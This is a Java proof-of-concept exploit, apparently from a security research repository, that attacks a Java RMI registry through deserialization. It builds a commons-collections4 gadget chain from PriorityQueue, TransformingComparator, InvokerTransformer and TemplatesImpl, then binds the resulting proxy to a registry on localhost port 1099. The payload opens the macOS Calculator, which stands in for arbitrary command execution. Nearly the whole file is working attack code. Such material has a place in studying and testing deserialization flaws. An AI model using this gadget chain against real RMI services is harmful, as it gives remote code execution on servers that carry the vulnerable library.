package com.threedr3am.bug.rmi.registry;

import com.threedr3am.bug.common.utils.Reflections;
import com.threedr3am.bug.rmi.utils.Gadgets;
import java.rmi.AlreadyBoundException;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.PriorityQueue;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

/**
 * RMI服务端攻击RMI Registry
 *
 * 需要服务端和注册中心都存在此依赖 org.apache.commons:commons-collections4:4.0
 *
 * @author threedr3am
 */
public class AttackRMIRegistry {

  public static void main(String[] args) {
    try {
      Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
      Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap("threedr3am", makePayload(new String[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"})), Remote.class);
      registry.bind("hello", remote);
    } catch (AlreadyBoundException | RemoteException e) {
      e.printStackTrace();
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  private static Object makePayload(String[] args) throws Exception {
    final Object templates = Gadgets.createTemplatesImpl(args[0]);
    // mock method name until armed
    final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

    // create queue with numbers and basic comparator
    final PriorityQueue<Object> queue = new PriorityQueue<Object>(2,new TransformingComparator(transformer));
    // stub data for replacement later
    queue.add(1);
    queue.add(1);

    // switch method called by comparator
    Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");

    // switch contents of queue
    final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
    queueArray[0] = templates;
    queueArray[1] = 1;
    return queue;
  }
}
